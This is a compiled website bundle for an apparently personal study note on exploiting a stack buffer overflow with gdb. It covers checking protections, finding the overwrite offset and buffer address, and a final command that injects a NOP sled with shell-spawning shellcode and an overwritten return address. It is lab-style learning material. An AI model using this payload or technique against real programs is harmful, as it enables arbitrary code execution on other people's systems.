"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[9253],{40:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/finding-break-offset-8ac6a49f811e411349656944e86827f1.png"},1109:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/pattern-offset-29c711a650750f87464bdab075247188.png"},2109:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>a,default:()=>f,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"general/Buffer Overflow","title":"Buffer Overflow","description":"Check defenses enabled using gdb  then checksec and use the appropriate section to exploit.","source":"@site/docs/general/Buffer Overflow.md","sourceDirName":"general","slug":"/general/Buffer Overflow","permalink":"/portfolio/docs/general/Buffer Overflow","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1771457558000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"Backgrounding","permalink":"/portfolio/docs/general/Backgrounding"},"next":{"title":"Connecting","permalink":"/portfolio/docs/general/Connecting"}}');var r=t(4848),i=t(8453);const o={},a=void 0,d={},c=[{value:"No stack canary, ASLR",id:"no-stack-canary-aslr",level:2},{value:"Finding address of buffer",id:"finding-address-of-buffer",level:2}];function l(e){const n={a:"a",code:"code",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(n.p,{children:["Check defenses enabled using ",(0,r.jsx)(n.code,{children:"gdb <binary file>"})," then ",(0,r.jsx)(n.code,{children:"checksec"})," and use the appropriate section to exploit."]}),"\n",(0,r.jsx)(n.h2,{id:"no-stack-canary-aslr",children:"No stack canary, ASLR"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"pattern create 200"})," or more than 200 based on the size of the buffer."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"run $(python -c 'print \"<output of prev command without the quotes>\"')"})," (Use ",(0,r.jsx)(n.code,{children:"run < <(python -c...)"})," if the user input is not supposed to be in the arguments)\r\n",(0,r.jsx)(n.img,{alt:"RBP override",src:t(5290).A+"",width:"1492",height:"784"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"pattern offset <data inside RBP>"})," (refer to image below)\r\n",(0,r.jsx)(n.img,{alt:"pattern offset command",src:t(1109).A+"",width:"631",height:"79"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"/docs/general/Buffer%20Overflow#finding-address-of-buffer",children:"Find address of buffer"}),". Then put it as the last 8 bytes in the command below (+offset a few bytes so that it will land on the NOP slide). Take note if ur system is using big endian or little endian."]}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"run $(python -c \"print '\\x90'*<offset-32> + '\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05' + '\\x90'*16 + '\\xb0\\xe2\\xff\\xff\\xff\\x7f\\x00\\x00'\")"})}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"finding-address-of-buffer",children:"Finding address of buffer"}),"\n",(0,r.jsx)(n.p,{children:"Let's say the vulnerable buffer is a variable named 'buf'."}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"disas main"})}),"\n",(0,r.jsxs)(n.li,{children:["Find out where buf has been already been allocated. Let's say the vulnerable function is strcpy, then choose the offset of the instruction right after the strcpy call.\r\n",(0,r.jsx)(n.img,{alt:"Finding break offset",src:t(40).A+"",width:"765",height:"598"})]}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"break <address found in prev step>"})}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"run $(python -c 'print(\"F\"*300)')"})," (run the program normally (i think))"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"print &buf"}),"\r\n",(0,r.jsx)(n.img,{alt:"print &amp;buf command output",src:t(6116).A+"",width:"1534",height:"750"})]}),"\n"]})]})}function f(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},5290:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/RBP-override-5a67e9131ec78e8fd39e43fbb0477a59.png"},6116:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/print-&buf-b73a6e4f32469dab63c8ba67cb6c39b7.png"},8453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>a});var s=t(6540);const r={},i=s.createContext(r);function o(e){const n=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);